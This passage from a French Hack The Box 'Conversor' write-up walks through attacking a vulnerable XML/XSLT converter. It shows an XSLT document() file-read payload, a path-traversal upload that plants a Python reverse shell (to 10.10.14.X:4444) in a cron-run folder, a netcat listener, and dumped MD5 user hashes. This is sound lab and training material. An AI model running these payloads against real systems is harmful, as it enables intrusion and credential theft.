+</span></span><span style="display:flex;"><span>    xslt_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER, xslt_file<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    xml_file<span style="color:#f92672">.</span>save(xml_path)
+</span></span><span style="display:flex;"><span>    xslt_file<span style="color:#f92672">.</span>save(xslt_path)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ✅ Parser XML sécurisé</span>
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>XMLParser(
+</span></span><span style="display:flex;"><span>        resolve_entities<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        no_network<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>        dtd_validation<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        load_dtd<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    xml_tree <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>parse(xml_path, parser)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ❌ Parser XSLT non sécurisé !</span>
+</span></span><span style="display:flex;"><span>    xslt_tree <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>parse(xslt_path)  <span style="color:#75715e"># Pas de restrictions</span>
+</span></span><span style="display:flex;"><span>    transform <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>XSLT(xslt_tree)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> transform(xml_tree)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str(result)
+</span></span></code></pre></div><p><strong>Observations critiques</strong> :</p>
+<ol>
+<li>Le parser XML est correctement sécurisé (pas d&rsquo;XXE possible)</li>
+<li>Le parser XSLT <strong>n&rsquo;a aucune restriction</strong> → fonction <code>document()</code> disponible</li>
+<li>Aucune validation des noms de fichiers → <strong>Path Traversal</strong></li>
+</ol>
+<h4 id="-installmd-configuration-système">📄 install.md (Configuration système)<a hidden class="anchor" aria-hidden="true" href="#-installmd-configuration-système">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span><span style="color:#75715e">## Cron Jobs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>Pour automatiser le nettoyage et la maintenance :
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">*</span> * <span style="font-style:italic">* *</span> <span style="font-style:italic">* www-data for f in /var/www/conversor.htb/scripts/*</span>.py; do python3 &#34;$f&#34;; done
+</span></span></code></pre></div><p><strong>Observation critique</strong> :</p>
+<ul>
+<li>Un cron job exécute <strong>tous les fichiers Python</strong> dans <code>/var/www/conversor.htb/scripts/</code></li>
+<li>Exécution <strong>chaque minute</strong> en tant que <code>www-data</code></li>
+<li>Si nous pouvons écrire dans ce répertoire → <strong>RCE</strong></li>
+</ul>
+<hr>
+<h2 id="-analyse-des-vulnérabilités">🔓 Analyse des vulnérabilités<a hidden class="anchor" aria-hidden="true" href="#-analyse-des-vulnérabilités">#</a></h2>
+<h3 id="1-xslt-injection--local-file-inclusion-lfi">1️⃣ XSLT Injection → Local File Inclusion (LFI)<a hidden class="anchor" aria-hidden="true" href="#1-xslt-injection--local-file-inclusion-lfi">#</a></h3>
+<p><strong>CWE-91: XML Injection (XPath Injection)</strong></p>
+<p>Le parser XSLT accepte la fonction <code>document()</code> qui permet de lire des fichiers arbitraires :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;document(&#39;file:///etc/passwd&#39;)&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p><strong>Impact</strong> :</p>
+<ul>
+<li>Lecture de fichiers sensibles</li>
+<li>Reconnaissance du système</li>
+<li>Découverte d&rsquo;informations critiques</li>
+</ul>
+<h3 id="2-path-traversal">2️⃣ Path Traversal<a hidden class="anchor" aria-hidden="true" href="#2-path-traversal">#</a></h3>
+<p><strong>CWE-22: Improper Limitation of a Pathname to a Restricted Directory</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>xslt_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER, xslt_file<span style="color:#f92672">.</span>filename)
+</span></span></code></pre></div><p>Aucune validation du nom de fichier permet l&rsquo;utilisation de séquences <code>../</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../scripts/revshell.py&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>conversor<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>uploads<span style="color:#f92672">/../</span>scripts<span style="color:#f92672">/</span>revshell<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>conversor<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>scripts<span style="color:#f92672">/</span>revshell<span style="color:#f92672">.</span>py
+</span></span></code></pre></div><p><strong>Impact</strong> :</p>
+<ul>
+<li>Écriture de fichiers en dehors du répertoire uploads</li>
+<li>Compromission du répertoire scripts</li>
+</ul>
+<h3 id="3-cron-job-misconfiguration">3️⃣ Cron Job Misconfiguration<a hidden class="anchor" aria-hidden="true" href="#3-cron-job-misconfiguration">#</a></h3>
+<p><strong>CWE-732: Incorrect Permission Assignment for Critical Resource</strong></p>
+<p>Le cron job exécute aveuglément tous les fichiers <code>.py</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* * * * * www-data <span style="color:#66d9ef">for</span> f in /var/www/conversor.htb/scripts/*.py; <span style="color:#66d9ef">do</span> python3 <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p><strong>Impact</strong> :</p>
+<ul>
+<li>Combined avec Path Traversal → RCE automatique</li>
+<li>Exécution dans un délai maximum de 60 secondes</li>
+</ul>
+<h3 id="4-weak-password-hashing">4️⃣ Weak Password Hashing<a hidden class="anchor" aria-hidden="true" href="#4-weak-password-hashing">#</a></h3>
+<p><strong>CWE-327: Use of a Broken or Risky Cryptographic Algorithm</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Dans users.db</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span></code></pre></div><p><strong>Impact</strong> :</p>
+<ul>
+<li>MD5 est obsolète et facilement crackable</li>
+<li>Rainbow tables et hashcat efficaces</li>
+</ul>
+<hr>
+<h2 id="-exploitation---initial-foothold">💥 Exploitation - Initial Foothold<a hidden class="anchor" aria-hidden="true" href="#-exploitation---initial-foothold">#</a></h2>
+<h3 id="phase-1--xslt-injection-pour-reconnaissance">Phase 1 : XSLT Injection pour reconnaissance<a hidden class="anchor" aria-hidden="true" href="#phase-1--xslt-injection-pour-reconnaissance">#</a></h3>
+<h4 id="fichier-xml-reconxml">Fichier XML (recon.xml)<a hidden class="anchor" aria-hidden="true" href="#fichier-xml-reconxml">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;message&gt;</span>Reconnaissance<span style="color:#f92672">&lt;/message&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><h4 id="fichier-xslt-malveillant-reconxslt">Fichier XSLT malveillant (recon.xslt)<a hidden class="anchor" aria-hidden="true" href="#fichier-xslt-malveillant-reconxslt">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;xsl:stylesheet</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span> <span style="color:#a6e22e">xmlns:xsl=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;xsl:output</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;html&#34;</span> <span style="color:#a6e22e">indent=</span><span style="color:#e6db74">&#34;yes&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;xsl:template</span> <span style="color:#a6e22e">match=</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;html&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;head&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;title&gt;</span>Reconnaissance Results<span style="color:#f92672">&lt;/title&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;style&gt;</span>
+</span></span><span style="display:flex;"><span>                    body {
+</span></span><span style="display:flex;"><span>                        background-color: #000;
+</span></span><span style="display:flex;"><span>                        color: #0f0;
+</span></span><span style="display:flex;"><span>                        font-family: &#39;Courier New&#39;, monospace;
+</span></span><span style="display:flex;"><span>                        padding: 20px;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    h2 {
+</span></span><span style="display:flex;"><span>                        color: #0ff;
+</span></span><span style="display:flex;"><span>                        border-bottom: 2px solid #0f0;
+</span></span><span style="display:flex;"><span>                        padding-bottom: 5px;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    pre {
+</span></span><span style="display:flex;"><span>                        background-color: #111;
+</span></span><span style="display:flex;"><span>                        border: 1px solid #0f0;
+</span></span><span style="display:flex;"><span>                        padding: 15px;
+</span></span><span style="display:flex;"><span>                        overflow-x: auto;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/style&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/head&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;body&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;h1&gt;</span>System Reconnaissance<span style="color:#f92672">&lt;/h1&gt;</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;h2&gt;</span>📄 /etc/passwd<span style="color:#f92672">&lt;/h2&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;pre&gt;&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;document(&#39;file:///etc/passwd&#39;)&#34;</span><span style="color:#f92672">/&gt;&lt;/pre&gt;</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;h2&gt;</span>📂 Scripts Directory Listing<span style="color:#f92672">&lt;/h2&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;pre&gt;&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;document(&#39;file:///var/www/conversor.htb/scripts/&#39;)&#34;</span><span style="color:#f92672">/&gt;&lt;/pre&gt;</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;h2&gt;</span>🔧 Application Configuration<span style="color:#f92672">&lt;/h2&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;pre&gt;&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;document(&#39;file:///var/www/conversor.htb/app.py&#39;)&#34;</span><span style="color:#f92672">/&gt;&lt;/pre&gt;</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;h2&gt;</span>💾 Database Location<span style="color:#f92672">&lt;/h2&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;pre&gt;&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;document(&#39;file:///var/www/conversor.htb/instance/&#39;)&#34;</span><span style="color:#f92672">/&gt;&lt;/pre&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/body&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/html&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/xsl:template&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/xsl:stylesheet&gt;</span>
+</span></span></code></pre></div><h4 id="exploitation-manuelle">Exploitation manuelle<a hidden class="anchor" aria-hidden="true" href="#exploitation-manuelle">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. Créer un compte</span>
+</span></span><span style="display:flex;"><span>curl -X POST http://conversor.htb/register <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;username=hacker&amp;password=hacker123&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Se connecter et récupérer le cookie de session</span>
+</span></span><span style="display:flex;"><span>curl -X POST http://conversor.htb/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;username=hacker&amp;password=hacker123&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -c cookies.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Uploader les fichiers de reconnaissance</span>
+</span></span><span style="display:flex;"><span>curl -X POST http://conversor.htb/convert <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b cookies.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;xml_file=@recon.xml&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;xslt_file=@recon.xslt&#34;</span>
+</span></span></code></pre></div><p><strong>Résultat</strong> : Nous obtenons le contenu de <code>/etc/passwd</code> et confirmons la structure du système.</p>
+<h3 id="phase-2--path-traversal--reverse-shell">Phase 2 : Path Traversal + Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#phase-2--path-traversal--reverse-shell">#</a></h3>
+<h4 id="création-du-reverse-shell-python">Création du reverse shell Python<a hidden class="anchor" aria-hidden="true" href="#création-du-reverse-shell-python">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.14.X&#34;</span>  <span style="color:#75715e"># Votre IP Kali</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((LHOST, LPORT))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># stdin</span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># stdout</span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">2</span>)  <span style="color:#75715e"># stderr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>])
+</span></span></code></pre></div><h4 id="exploitation-avec-burp-suite">Exploitation avec Burp Suite<a hidden class="anchor" aria-hidden="true" href="#exploitation-avec-burp-suite">#</a></h4>
+<ol>
+<li>
+<p><strong>Intercepter la requête POST</strong> vers <code>/convert</code></p>
+</li>
+<li>
+<p><strong>Modifier le nom du fichier XSLT</strong> :</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /convert <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">conversor.htb</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=...</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundary...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------WebKitFormBoundary...
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;xml_file&#34;; filename=&#34;dummy.xml&#34;
+</span></span><span style="display:flex;"><span>Content-Type: text/xml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span style="display:flex;"><span>&lt;root&gt;exploit&lt;/root&gt;
+</span></span><span style="display:flex;"><span>------WebKitFormBoundary...
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;xslt_file&#34;; filename=&#34;../scripts/revshell.py&#34;
+</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>import socket,subprocess,os
+</span></span><span style="display:flex;"><span>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s.connect((&#34;10.10.14.X&#34;,4444))
+</span></span><span style="display:flex;"><span>os.dup2(s.fileno(),0)
+</span></span><span style="display:flex;"><span>os.dup2(s.fileno(),1)
+</span></span><span style="display:flex;"><span>os.dup2(s.fileno(),2)
+</span></span><span style="display:flex;"><span>subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;])
+</span></span><span style="display:flex;"><span>------WebKitFormBoundary...--
+</span></span></code></pre></div><ol start="3">
+<li><strong>Démarrer le listener</strong> :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ol start="4">
+<li><strong>Attendre l&rsquo;exécution du cron</strong> (max 60 secondes)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>Connection received on 10.10.11.92 XXXXX
+</span></span><span style="display:flex;"><span>www-data@conversor:/var/www/conversor.htb$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="stabilisation-du-shell">Stabilisation du shell<a hidden class="anchor" aria-hidden="true" href="#stabilisation-du-shell">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Shell interactif Python</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuration du terminal</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>export SHELL<span style="color:#f92672">=</span>/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Background du shell (Ctrl+Z)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Puis sur Kali :</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Appuyer sur Entrée deux fois</span>
+</span></span></code></pre></div><hr>
+<h2 id="-escalade-de-privilèges---user">👤 Escalade de privilèges - User<a hidden class="anchor" aria-hidden="true" href="#-escalade-de-privilèges---user">#</a></h2>
+<h3 id="énumération-du-système">Énumération du système<a hidden class="anchor" aria-hidden="true" href="#énumération-du-système">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~$ whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@conversor:~$ pwd
+</span></span><span style="display:flex;"><span>/var/www/conversor.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@conversor:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> www-data www-data <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 10:15 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">15</span> 08:20 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">2847</span> Dec <span style="color:#ae81ff">15</span> 09:30 app.py
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 11:45 instance
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 10:15 scripts
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 11:30 uploads
+</span></span></code></pre></div><h3 id="exploration-de-la-base-de-données">Exploration de la base de données<a hidden class="anchor" aria-hidden="true" href="#exploration-de-la-base-de-données">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~$ cd instance/
+</span></span><span style="display:flex;"><span>www-data@conversor:~/instance$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 11:45 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> www-data www-data  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 10:15 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">16384</span> Dec <span style="color:#ae81ff">20</span> 11:45 users.db
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@conversor:~/instance$ file users.db
+</span></span><span style="display:flex;"><span>users.db: SQLite 3.x database
+</span></span></code></pre></div><h3 id="extraction-des-credentials">Extraction des credentials<a hidden class="anchor" aria-hidden="true" href="#extraction-des-credentials">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~/instance$ sqlite3 users.db
+</span></span><span style="display:flex;"><span>SQLite version 3.37.2 2022-01-06 13:25:41
+</span></span><span style="display:flex;"><span>Enter <span style="color:#e6db74">&#34;.help&#34;</span> <span style="color:#66d9ef">for</span> usage hints.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span>users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlite&gt; .schema users
+</span></span><span style="display:flex;"><span>CREATE TABLE users <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>    id INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span><span style="display:flex;"><span>    username TEXT UNIQUE NOT NULL,
+</span></span><span style="display:flex;"><span>    password TEXT NOT NULL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlite&gt; SELECT * FROM users;
+</span></span><span style="display:flex;"><span>1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+</span></span><span style="display:flex;"><span>2|admin|098f6bcd4621d373cade4e832627b4f6
+</span></span><span style="display:flex;"><span>3|hacker|fcab0453879a2b2281bc5073e3f5fe54
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlite&gt; .quit
+</span></span></code></pre></div><p><strong>Credentials trouvés</strong> :</p>
+<ul>
+<li><code>fismathack:5b5c3ac3a1c897c94caad48e6c71fdec</code> (MD5)</li>
+<li><code>admin:098f6bcd4621d373cade4e832627b4f6</code> (MD5)</li>
+</ul>
+<h3 id="cracking-des-hash-md5">Cracking des hash MD5<a hidden class="anchor" aria-hidden="true" href="#cracking-des-hash-md5">#</a></h3>
